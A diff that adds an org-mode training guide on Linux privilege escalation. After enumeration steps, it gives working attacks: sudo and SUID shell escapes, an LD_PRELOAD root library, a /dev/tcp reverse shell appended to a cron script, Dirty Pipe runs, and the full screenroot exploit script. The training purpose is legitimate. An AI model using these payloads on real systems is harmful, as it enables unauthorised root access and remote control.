@@ -1,0 +1,624 @@
+#+title: Linux Privilege Escalation
+#+author: gabriel
+
+* intro
+Privilege escalation is a process that allows an attacker to gain complete access to the system from limited user rights. In this training, we will start with an introduction to the basic concepts and then delve into various techniques and tools for privilege escalation in Linux operating systems.
+
+Throughout the training, we will cover topics such as sudo, SUID, cron jobs, capabilities, shared libraries, kernel vulnerabilities, and vulnerable services. Additionally, we will use tools and techniques for performing privilege escalation attacks.
+
+
+* enumeration
+The key to privilege escalation is enumeration. There are many helper scripts (like LinEnum) available for enumeration. However, it is also important to understand what information to look for and how to perform enumeration manually
+
+*OS Version* ->
+Knowing the Linux distribution used on the target system (Ubuntu, Debian, FreeBSD, Fedora, SUSE, Red Hat, CentOS, etc.)
+
+*Kernel Version* ->
+Just like the operating system version, there may be public exploits targeting vulnerabilities in specific kernel versions. Kernel exploits can cause system instability and even complete system crashes.
+
+*Running services* ->
+Knowing which services are running on the server is crucial, especially those running as root. Misconfigured or vulnerable services running as root can provide a good avenue for privilege escalation attacks.
+
+* Listing active processes
+#+begin_src sh
+root💀hackerbox:~# ps aux | grep root
+root           1  0.8  1.1  98992 10920 ?        Ss   01:25   0:01 /sbin/init
+root           2  0.0  0.0      0     0 ?        S    01:25   0:00 [kthreadd]
+root           3  0.0  0.0      0     0 ?        I<   01:25   0:00 [rcu_gp]
+root           4  0.0  0.0      0     0 ?        I<   01:25   0:00 [rcu_par_gp]
+root           5  0.0  0.0      0     0 ?        I    01:25   0:00 [kworker/0:0-events]
+root           6  0.0  0.0      0     0 ?        I<   01:25   0:00 [kworker/0:0H-events_highpri]
+root           7  0.0  0.0      0     0 ?        I    01:25   0:00 [kworker/u2:0-events_unbound]
+root           8  0.0  0.0      0     0 ?        I<   01:25   0:00 [mm_percpu_wq]
+root           9  0.0  0.0      0     0 ?        S    01:25   0:00 [rcu_tasks_rude_]
+#+end_src
+
+*Logged-in Users* ->
+Knowing which users are logged in and what they are doing can provide more information about possible local lateral movement and privilege escalation paths.
+
+*Installed packages and versions* ->
+ Like running services, it is important to check for any outdated or vulnerable services/packages that can be easily used for privilege escalation.
+
+#+begin_src sh
+root💀hackerbox:~# ps au
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         671  0.0  0.1   5880  1072 tty1     Ss+  01:25   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+root         672  0.0  5.6 579460 55780 tty7     Ssl+ 01:25   0:00 /usr/lib/xorg/Xorg :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -no
+root        1548  0.0  0.5   8196  5128 pts/0    Ss   01:26   0:00 bash
+root        1668  0.0  0.1   9704  1500 pts/0    R+   01:28   0:00 ps au
+#+end_src
+
+* home directory content of users
+Can you access other users' home directories? User home folders can contain SSH keys, browser-stored passwords, or configuration files and scripts with credentials used to access other systems.
+#+begin_src sh
+root💀hackerbox:~# ls -la
+
+total 184
+drwx------ 29 root      root       4096 Mar 15 01:25 .
+drwxr-xr-x 18 root      root       4096 Mar 11 00:09 ..
+-rw-r--r--  1 root      root       4622 Jan 12 09:59 .bashrc
+-rw-r--r--  1 root      root       4622 Jan 12 09:59 .bash_history
+drwxr-xr-x 23 root      root       4096 Mar 14 02:37 .config
+drwxr-xr-x  2 root      root       4096 Mar 14 02:33 config
+-rw-------  1 root      root          0 Mar 15 01:25 .history
+drwx------  4 root      root       4096 Feb 27  2023 .mozilla
+-rw-r--r--  1 root      root        198 Feb 27  2023 .profile
+drwx------  2 root      root       4096 Mar 12 02:23 .ssh
+#+end_src
+
+
+** ssh directory contents
+If you find an SSH key for your current user, it can be used to open an SSH session on the machine. SSH keys can also be used to access other systems within the network.
+
+#+begin_src sh
+root💀hackerbox:~# ls -l .ssh
+
+total 12
+-rw------- 1 root root 1 Mar 12 02:23 known_hosts
+-rw------- 1 root root 1 Mar 12 02:23 id_rsa
+-rw-r--r-- 1 root root 1 Mar 12 02:23 id_rsa.pub
+#+end_src
+
+** bash history
+Checking a user's bash history is important, as it might reveal passwords being passed as command-line arguments, interactions with git repositories, setting up cron jobs, and more.
+#+begin_src sh
+root💀hackerbox:~# history
+1  ps aux
+2  clear
+3  cd /root
+4  cat password.txt
+5  cd .ssh/
+6  ls
+7  ssh -i id_rsa root@172.10.3.5
+8  history
+#+end_src
+
+** sudo - listing user privilges
+Users on the system might run any commands as another user or as root through the sudo (SuperUserDO) mechanism. However, to exploit sudo privileges, you might need the user's password.
+#+begin_src sh
+root💀hackerbox:~# sudo -l
+Matching Defaults entries for root on hackerbox:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+Runas and Command-specific defaults for root:
+    Defaults!/etc/ctdb/statd-callout !requiretty
+
+User root may run the following commands on hackerbox:
+    (root) NOPASSWD: /usr/bin/crontab
+#+end_src
+
+** configuration files
+Configuration files can contain important information. Usernames, passwords, and other secret keys can be searched within files ending with extensions such as .conf and .config.
+
+** cron jobs
+Cron jobs in Linux systems are scheduled tasks. They are commonly set up for maintenance and backup tasks. Misconfigurations with loose permissions can allow scheduled tasks to be exploited for privilege escalation.
+#+begin_src sh
+root💀hackerbox:~# cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#+end_src
+
+** file systems and additional drives
+If you discover and can mount an additional drive or unmounted file system, these drives may contain sensitive files, passwords, or backups that can be used for privilege escalation.
+#+begin_src sh
+root💀hackerbox:~# lsblk
+
+NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
+sda      8:0    0   24G  0 disk
+├─sda1   8:1    0   23G  0 part /
+├─sda2   8:2    0    1K  0 part
+└─sda5   8:5    0  975M  0 part [SWAP]
+sr0     11:0    1  231M  0 rom
+#+end_src
+
+** finding writable directories
+If you need to download tools to the system, it is important to know which directories are writable. You may find a writable directory into which a scheduled task (cron job) places files. If the script executed by the scheduled task is writable, it can be used to escalate privileges.
+#+begin_src sh
+root💀hackerbox:~# find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
+/dev/mqueue
+/dev/shm
+/tmp
+/tmp/.X11-unix
+/tmp/.XIM-unix
+/tmp/systemd-private-9c56bb8d08a2485e9261acac1ff3cb4a-apache2.service-EwDgXk/tmp
+/tmp/systemd-private-9c56bb8d08a2485e9261acac1ff3cb4a-colord.service-WFLdVf/tmp
+/tmp/systemd-private-9c56bb8d08a2485e9261acac1ff3cb4a-tor@default.service-d9bNO5/tmp
+/tmp/systemd-private-9c56bb8d08a2485e9261acac1ff3cb4a-upower.service-TIjpGs/tmp
+/tmp/systemd-private-9c56bb8d08a2485e9261acac1ff3cb4a-systemd-timesyncd.service-EJMeLx/tmp
+/tmp/.ICE-unix
+/tmp/systemd-private-9c56bb8d08a2485e9261acac1ff3cb4a-systemd-logind.service-rOWFA7/tmp
+/tmp/systemd-private-9c56bb8d08a2485e9261acac1ff3cb4a-ModemManager.service-CEASNE/tmp
+/tmp/.font-unix
+/tmp/.Test-unix
+/var/lib/php/sessions
+/var/tmp
+/var/tmp/systemd-private-9c56bb8d08a2485e9261acac1ff3cb4a-colord.service-TGhpRJ/tmp
+/var/tmp/systemd-private-9c56bb8d08a2485e9261acac1ff3cb4a-upower.service-FQGJT6/tmp
+/var/tmp/systemd-private-9c56bb8d08a2485e9261acac1ff3cb4a-ModemManager.service-UOAw2C/tmp
+/var/tmp/systemd-private-9c56bb8d08a2485e9261acac1ff3cb4a-apache2.service-u2xfPZ/tmp
+/var/tmp/systemd-private-9c56bb8d08a2485e9261acac1ff3cb4a-systemd-logind.service-rc6qVk/tmp
+/var/tmp/systemd-private-9c56bb8d08a2485e9261acac1ff3cb4a-tor@default.service-P6rkag/tmp
+/var/tmp/systemd-private-9c56bb8d08a2485e9261acac1ff3cb4a-systemd-timesyncd.service-gE0G2B/tmp
+/proc
+/run/lock
+#+end_src
+
+
+** finding writable files
+While modifying configuration files can be risky for the system's proper functioning, minor changes can sometimes provide greater access. Additionally, any script files run as root by scheduled tasks (cron jobs) can be slightly modified for privilege escalation.
+#+begin_src sh
+root💀hackerbox:~# find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+/var/lib/gems/3.1.0/gems/evil-winrm-3.5/LICENSE
+/var/lib/gems/3.1.0/gems/evil-winrm-3.5/evil-winrm.rb
+/var/lib/gems/3.1.0/gems/evil-winrm-3.5/bin/evil-winrm
+/sys/kernel/security/apparmor/.remove
+/sys/kernel/security/apparmor/.replace
+/sys/kernel/security/apparmor/.load
+/sys/kernel/security/apparmor/.access
+/sys/kernel/security/tomoyo/self_domain
+/etc/config/burpsuite-settings.json
+/proc
+/usr/local/bin/clean_logs.sh
+#+end_src
+
+
+* abusing sudo privileges
+Sudo privileges can be given to a user, allowing them to execute commands with the rights of the root user. When a command is run with sudo, the system will check whether the user executing the command has the appropriate rights as configured in /etc/sudoers. Upon gaining access to a system, you should run sudo -l to check if the current user has any sudo privileges.
+#+begin_src sh
+user@hackerbox:~$ sudo -l
+Matching Defaults entries for user on hackerbox:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User user may run the following commands on hackerbox:
+    (ALL : ALL) NOPASSWD: /usr/bin/python3
+#+end_src
+
+Misconfiguring sudo privileges is a possible error. For example, a user might be granted the ability to run commands with root privileges without requiring a password.
+
+According to the configuration in the improperly set up sudoers file above, the "user" account has the right to run the "python3" command with root privileges and without a password. In this case, an attacker might attempt privilege escalation by using the -c cmd parameter of the python3 command.
+#+begin_src python
+user@hackerbox:~$ python3 -h
+usage: python3 [option] ... [-c cmd | -m mod | file | -] [arg] ...
+Options (and corresponding environment variables):
+<...SNIP...>
+-c cmd : program passed in as string (terminates option list)
+-d     : turn on parser debugging output (for experts only, only works on
+        debug builds); also PYTHONDEBUG=x
+-E     : ignore PYTHON* environment variables (such as PYTHONPATH)
+-h     : print this help message and exit (also -? or --help)
+-i     : inspect interactively after running script; forces a prompt even
+        if stdin does not appear to be a terminal; also PYTHONINSPECT=x
+-I     : isolate Python from the user's environment (implies -E and -s)
+-m mod : run library module as a script (terminates option list)
+<SNIP>
+#+end_src
+
+Let's attempt to open a new bash shell running with root privileges by executing python3 with the -c parameter.
+: python3 -c 'import os; os.system("/bin/bash")'
+
+
+* suid - special permissions
+The Set User ID (setuid) permission allows a user to run a program or script with the permissions of another user, typically with root privileges.
+
+The SUID bit appears as an s in the permissions section of a directory listing. We can find files with the SUID bit set by running the following command:
+#+begin_src sh
+user@hackerbox:~$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+-rwsr-xr-x 1 root root 302904 Mar 14 02:38 /opt/BurpSuiteCommunity/burpbrowser/122.0.6261.111/chrome-sandbox
+-rwsr-sr-x 1 root root 14608 Feb  1  2023 /usr/lib/xorg/Xorg.wrap
+-rwsr-xr-- 1 root messagebus 51336 Oct  5  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 555584 Dec 21 10:07 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 52808 May 25  2023 /usr/lib/mongodb-compass/chrome-sandbox
+-rwsr-xr-x 1 root root 146480 Dec  3 07:58 /usr/sbin/mount.nfs
+-rwsr-xr-x 1 root root 48128 Aug 26  2022 /usr/sbin/mount.cifs
+-rwsr-xr-x 1 root root 1360680 Jul 13  2021 /usr/sbin/exim4
+-rwsr-xr-x 1 root root 35040 Jan 20  2022 /usr/bin/umount
+-rwsr-xr-x 1 root root 71912 Jan 20  2022 /usr/bin/su
+-rwsr-xr-x 1 root root 182600 Jan 14  2023 /usr/bin/sudo
+-rwsr-xr-x 1 root root 44632 Feb  7  2020 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 63960 Feb  7  2020 /usr/bin/passwd
+-rwsr-xr-x 1 root root 35048 Jun 20  2021 /usr/bin/fusermount3
+-rwsr-xr-x 1 root root 58416 Feb  7  2020 /usr/bin/chfn
+-rwsr-xr-x 1 root root 158448 Nov  2  2022 /usr/bin/ntfs-3g
+-rwsr-xr-x 1 root root 23448 Jan 13  2022 /usr/bin/pkexec
+#+end_src
+
+Reverse engineering a program with the SUID bit set may reveal a vulnerability that can be exploited to escalate our privileges. Many programs have additional special permissions that can be used to execute commands. If the SUID bit is set, these programs can be used for privilege escalation.
+
+The Set-Group-ID (setgid or SGID) permission is another special permission that allows us to define an execution permission specific to the group to which binary files belong
+#+begin_src sh
+user@hackerbox:~$ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
+-rwsr-sr-x 1 root root 14608 Feb  1  2023 /usr/lib/xorg/Xorg.wrap
+#+end_src
+
+** GTFOBins
+GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions on misconfigured systems (privilege escalation). For each binary, it details specific payloads and parameters that can be used to break out of restricted shells, escalate privileges, create reverse shells, or read files.
+#+begin_src sh
+user@hackerbox:~$ ls -l /usr/bin/find
+-rwsr-xr-x 1 root root 311008 Jan  9  2021 /usr/bin/find
+
+user@hackerbox:~$ find . -exec /bin/bash -p \; -quit
+root💀hackerbox:~# id
+uid=0(root) gid=0(root) groups=0(root)
+#+end_src
+
+
+* abusing schedule tasks
+Cron jobs are a scheduling service in the Linux operating system used for executing commands or scripts automatically at specified times. Users can schedule processes to run at specified intervals (e.g., daily, weekly) or at specific times
+
+The crontab command is used to create a cron file that will be executed by the cron daemon at specified times. Each entry in the crontab file requires six fields: minute, hour, day, month, week, command.
+: 0 2 * * *   /home/user/backup.sh
+
+For system-wide tasks, the /etc/crontab file is used. This file specifies the username for the scheduled tasks, allowing tasks to be run with the permissions of the specified user. This file can only be edited by the root user or a user with full sudo privileges, but it can still be abused.
+
+. If you find a script that runs with root privileges and is writable by everyone, you can add commands to the end of the script. When the cron job runs, the commands you added will also be executed with root privileges.
+: 0 2 * * *   root    /root/backup.sh
+
+** example scenario
+#+begin_src sh
+user@hackerbox:~$ ls -l /etc/crontab
+-rw-r--r-- 1 root root 1042 Feb 22  2021 /etc/crontab
+user@hackerbox:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+
+# * *    * * *   root    /usr/local/bin/backup_log.sh
+#+end_src
+
+As seen above, we do not have permission to edit the /etc/crontab file. At the bottom of the file, we see an entry where the backup_log.sh script is scheduled to run every minute as root.
+
+#+begin_src sh
+user@hackerbox:~$ ls -l /usr/local/bin/backup_log.sh
+-rwxrwxrwx 1 root root 92 Feb 14 14:20 /usr/local/bin/backup_log.sh
+user@hackerbox:~$ cat /usr/local/bin/backup_log.sh
+#!/bin/bash
+
+# Config
+source /var/config
+
+# Backup
+BACKUP_FILE="${LOG_PATH}_backup_$(date +%Y%m%d%H%M%S).log"
+cp "$LOG_PATH" "$BACKUP_FILE"
+#+end_src
+
+We see that we have permission to edit the backup_log.sh script, which runs as a scheduled task. Let's add the following command to the end of the script to gain a reverse shell. For generating reverse shell payloads, refer to: https://www.revshells.com/
+: user@hackerbox:~$ echo "sh -i >& /dev/tcp/172.18.2.47/4444 0>&1" >> /usr/local/bin/backup_log.sh
+
+Then, use the netcat command to listen on port 4444 and wait for the reverse shell connection.
+#+begin_src sh
+user@hackerbox:~$ nc -lvp 4444
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listenin on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 172.18.2.47.
+Ncat: Connection from 172.18.2.47:49283.
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+#+end_src
+
+* capabilities
+Linux Capabilities are an access control mechanism that allows the operating system to assign specific privileges to processes rather than giving them all the privileges of the root user. This increases system security by ensuring processes only have the permissions they need.
+
+For instance, an application does not need root access to listen on network ports; it only requires the CAP_NET_BIND_SERVICE capability. This feature allows for more precise control over which processes have access to specific privileges, making it more secure than Unix's traditional model of granting privileges to users and groups.
+
+** set capabilit
+Capabilities can be set using the setcap command, which allows us to assign specific capabilities to executable files or programs. This command lets us specify the capability we want to set and the value we want to assign.
+
+For example, to set the cap_net_bind_service capability for an executable file, we can use the following command:
+#+begin_src sh
+root💀hackerbox:~# setcap cap_net_bind_service=+ep /usr/bin/vimroot💀hackerbox:~# setcap cap_net_bind_service=+ep /usr/bin/vim
+#+end_src
+
+When capabilities are set for a program, it means the program can perform certain actions that it couldn't without those capabilities.  For example, if the cap_net_bind_service capability is set for a program, it can bind to network ports, which is usually a restricted privilege.
+
+Some capabilities, such as ~cap_sys_admin~, which allows an executable file to perform actions with administrative privileges, can be dangerous if not used correctly.
+
+| Capability | Description
+| cap_sys_admin | Allows actions with administrative privileges, such as modifying system files or system settings.
+| cap_sys_chroot | Allows changing the root directory of the current process, granting access to otherwise inaccessible files and directories.
+| cap_sys_ptrace | Allows attaching to and debugging other processes, granting access to sensitive information or altering other processes' behavior.
+| cap_sys_nice | Allows increasing or decreasing the priority of processes, granting access to resources that would otherwise be restricted.
+| cap_sys_time | Allows changing the system clock, potentially manipulating timestamps or causing other processes to behave unexpectedly.
+| cap_sys_resource | Allows altering system resource limits, such as the maximum number of open file descriptors or the maximum amount of allocated memory.
+| cap_sys_module | Allows loading and unloading kernel modules, potentially altering the operating system's behavior or gaining access to sensitive information.
+| cap_net_bind_service | Allows binding to network ports, potentially granting access to sensitive information or performing unauthorized actions.
+| cap_dac_override | Allows bypassing file permissions to access files.
+| cap_sys_rawio | Grants the authority to perform I/O operations.
+| cap_net_raw | Allows processes to create RAW and PACKET sockets.
+| cap_setuid | Allows setting the effective user ID of the spawned process (including the root user ID).
+
+When a program runs with capabilities, it can perform actions allowed by those capabilities. This provides more granular control over the program's privileges and helps address security vulnerabilities and prevent unauthorized access to sensitive information.
+
+** setcap basic usage
+When using the setcap command to set capabilities for an executable file in Linux, we need to specify the capability we want to set and the value we want to assign.
+
+The values we use will depend on the capability we are setting and the privileges we want to grant to the executable file. Here are some example values we can use with the setcap command and a brief explanation of what they do:
+
+| Capability Value | Description
+| = | Sets the specified capability for the program but does not grant any privileges. This can be useful when we want to clear a previously set capability for a program.
+| +ep | Grants effective and permitted privileges for the specified capability to the executable file. This allows the program to perform actions permitted by the capability but not any actions not allowed by the capability.
+| +ei | Grants effective and inherited privileges for the specified capability to the program. This allows the program to perform actions permitted by the capability and the capability to be inherited by child processes.
+| +p | Grants permitted privileges for the specified capability to the executable file. This allows the executable to perform actions permitted by the capability but not any actions not allowed by the capability. This can be useful if we want to grant the capability to an executable but prevent it from inheriting the capability to child processes.
+
+Various Linux capabilities can be used to escalate privileges to the root level:
+| Capability | Description
+| cap_setuid | Allows a process to set its effective user ID (including the root user ID), which can be used to gain the privileges of another user.
+| cap_setgid | Allows setting the effective group ID, which can be used to gain the privileges of another group (including the root group).
+| cap_sys_admin | This capability provides a wide range of administrative privileges, including changing system settings and mounting/unmounting file systems.
+| cap_dac_override | Allows skipping file read, write, and execute permission checks.
+
+** enumerating capabilities
+Enumerating capabilities on a Linux system is important for ensuring system security. Below are the steps and commands to list and analyze existing capabilities:
+
+First, determine where the getcap command is located on the system using the whereis command
+#+begin_src sh
+whereis getcap
+
+getcap: /usr/sbin/getcap /usr/share/man/man8/getcap.8.gz
+#+end_src
+
+*** listing capabilities with getcap
+: /usr/sbin/getcap -r / 2>/dev/null
+
+This command scans all files on the system and lists the capabilities and their values assigned to each file. An example output might be:
+
+#+begin_src sh
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
+/usr/bin/ping cap_net_raw=ep
+/usr/bin/dumpcap cap_net_admin,cap_net_raw=eip
+/usr/bin/vim cap_net_bind_service=+ep
+#+end_src
+
+* shared libraries
+It is common for programs to use dynamically shared libraries. Libraries consist of compiled code that developers use to avoid rewriting the same code for multiple programs. There are two types of libraries in Linux: static libraries (denoted by the .a file extension) and dynamically linked shared object libraries (denoted by the .so file extension).
+
+There are multiple ways to specify the location of dynamic libraries. During compilation, we can use the -rpath or -rpath-link flags, or the LD_RUN_PATH or LD_LIBRARY_PATH environment variables to specify the location of dynamic libraries.
+
+Moreover, the LD_PRELOAD environment variable can load a library before executing a binary file. The functions in this library override the default functions.
+
+The shared libraries required for a binary to run can be viewed using the ldd utility.
+#+begin_src sh
+root💀hackerbox:~# ldd /bin/ping
+linux-vdso.so.1 (0x00007ffe891fa000)
+libcap.so.2 => /lib/x86_64-linux-gnu/libcap.so.2 (0x00007f0221bd4000)
+libidn2.so.0 => /lib/x86_64-linux-gnu/libidn2.so.0 (0x00007f0221bb3000)
+libresolv.so.2 => /lib/x86_64-linux-gnu/libresolv.so.2 (0x00007f0221ba2000)
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f02219c0000)
+libunistring.so.2 => /lib/x86_64-linux-gnu/libunistring.so.2 (0x00007f022183e000)
+/lib64/ld-linux-x86-64.so.2 (0x00007f0221c0e000)
+#+end_src
+
+** LD_PRELOAD Privilege escalation technique
+Let's look at an example of how we can use the LD_PRELOAD environment variable to escalate privileges. For this, we need a user with sudo privileges.
+#+begin_src sh
+user@hackerbox:~$ sudo -l
+Matching Defaults entries for user on debian:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
+
+User user may run the following commands on debian:
+    (ALL) NOPASSWD: /usr/local/bin/sys_backup
+#+end_src
+
+This user has the right to run the sys_backup program as root. However, this sys_backup program is not listed in GTFOBins, and since the /etc/sudoers entry specifies an absolute path, it cannot normally be used for privilege escalation.
+
+To use LD_PRELOAD for privilege escalation, save the following code in a file named escalate.c.
+#+begin_src c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setresuid(0, 0, 0);
+    system("/bin/bash -p");
+}
+#+end_src
+
+Then compile the code and produce the shared library output with the following command:
+: user@hackerbox:~$ gcc -fPIC -shared -nostartfiles -o /tmp/escalate.so escalate.c
+
+Finally, we can escalate our privileges by running the following command:
+#+begin_src sh
+user@hackerbox:~$ sudo LD_PRELOAD=/tmp/escalate.so /usr/local/bin/sys_backup
+root💀hackerbox:~# id
+uid=0(root) gid=0(root) groups=0(root)
+#+end_src
+
+* dirty pipe
+A security vulnerability found in the Linux operating system, known as Dirty Pipe (CVE-2022-0847), allows unauthorized users to write to root user files on the system. This vulnerability is technically similar to the Dirty Cow vulnerability discovered in 2016, which had a similar mechanism.
+
+Most versions of the Linux kernel from 5.8 onwards are affected by this vulnerability. Specifically, it affects Linux kernel versions from 5.8 to 5.15.25.12.
+
+The Dirty Pipe vulnerability leverages pipes, a mechanism frequently used in Unix systems for unidirectional inter-process communication. For example, by modifying the /etc/passwd file, we can allow the root user to log in directly without asking for a password.
+
+** dirty pipe exploit
+Let's download an exploit repository published on GitHub and compile the exploits.
+- https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/
+
+  #+begin_src sh
+user@hackerbox:~$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
+user@hackerbox:~$ cd CVE-2022-0847-DirtyPipe-Exploits
+user@hackerbox:~$ bash compile.sh
+  #+end_src
+
+  After compiling the exploit code, we have two different exploits. The first exploit (exploit-1) modifies the /etc/passwd file and grants us a root command prompt. For this, we need to verify the kernel version and then run the exploit.
+
+  *get the kernel version* ->
+  #+begin_src sh
+user@hackerbox:~$ uname -r
+5.11.0-051100-generic
+  #+end_src
+
+** exploit 1
+#+begin_src sh
+user@hackerbox:~$ ./exploit-1
+Backing up /etc/passwd to /tmp/passwd.bak ...
+Setting root password to "piped"...
+Password: Restoring /etc/passwd from /tmp/passwd.bak...
+Done! Popping shell... (run commands now)
+
+# id
+
+uid=0(root) gid=0(root) groups=0(root)
+#+end_src
+
+** exploit 2
+With the second exploit (exploit-2), we can run SUID binary files with root privileges. However, to do this, we first need to find these SUID binary files. We can use the following command:
+#+begin_src sh
+user@hackerbox:~$ find / -perm -4000 2>/dev/null
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/umount
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+#+end_src
+
+Next, we can select a binary and run the exploit by specifying the full path of the binary as an argument.
+#+begin_src sh
+user@hackerbox:~$ ./exploit-2 /usr/bin/su
+[+] hijacking suid binary..
+[+] dropping suid shell..
+[+] restoring suid binary..
+[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
+# whoami
+
+root
+#+end_src
+
+* vulnerable services
+Many vulnerable services can be exploited for privilege escalation. One example is the Screen service, a commonly used terminal multiplexer. A privilege escalation vulnerability exists in version 4.5.0 of the Screen service due to a lack of permission checks when opening a log file.
+#+begin_src sh
+user@hackerbox:~$ screen -v
+Screen version 4.05.00 (GNU) 10-Dec-16
+#+end_src
+
+This vulnerability allows an attacker to create a file owned by root in any directory and gain root access.
+
+** privilege escalation - Screen_Exploit.sh
+We can download and run the exploit related to the Screen service to escalate our privileges. https://www.exploit-db.com/exploits/41154
+
+#+begin_src sh
+user@hackerbox:~$ ./screen_exploit.sh
+
+~ gnu/screenroot ~
+[+] First, we create our shell and library...
+[+] Now we create our /etc/ld.so.preload file...
+[+] Triggering...
+' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+[+] done!
+No Sockets found in /run/screen/user.
+
+# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),1000(user)
+#+end_src
+
+** screen_exploit_poc.sh
+Here is the proof-of-concept script for the exploit:
+#+begin_src sh
+#!/bin/bash
+# screenroot.sh
+# setuid screen v4.5.0 local root exploit
+# abuses ld.so.preload overwriting to get root.
+# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
+# HACK THE PLANET
+# ~ infodox (25/1/2017)
+echo "~ gnu/screenroot ~"
+echo "[+] First, we create our shell and library..."
+cat << EOF > /tmp/libhax.c
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <sys/stat.h>
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown("/tmp/rootshell", 0, 0);
+    chmod("/tmp/rootshell", 04755);
+    unlink("/etc/ld.so.preload");
+    printf("[+] done!\n");
+}
+EOF
+gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+rm -f /tmp/libhax.c
+cat << EOF > /tmp/rootshell.c
+#include <stdio.h>
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp("/bin/sh", NULL, NULL);
+}
+EOF
+gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
+rm -f /tmp/rootshell.c
+echo "[+] Now we create our /etc/ld.so.preload file..."
+cd /etc
+umask 000 # because
+screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
+echo "[+] Triggering..."
+screen -ls # screen itself is setuid, so...
+/tmp/rootshell
+#+end_src
